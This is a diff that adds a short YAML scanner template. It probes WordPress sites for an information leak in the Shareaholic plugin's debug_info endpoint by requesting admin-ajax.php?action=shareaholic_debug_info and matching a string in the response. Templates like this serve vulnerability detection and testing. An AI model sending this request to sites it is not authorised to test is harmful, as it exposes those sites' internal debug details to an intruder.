@@ -1,0 +1,14 @@
+id: poc-yaml-shareaholic-info-leak
+info:
+  name: Shareaholic debug_info.php 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Shareaholic
+  osprey-id: vb_2022_0119
+requests:
+- method: GET
+  path: /wp-admin/admin-ajax.php?action=shareaholic_debug_info
+  expression: contains(body, "shareaholic_server_reachable")
+variables: {}
+transport: http
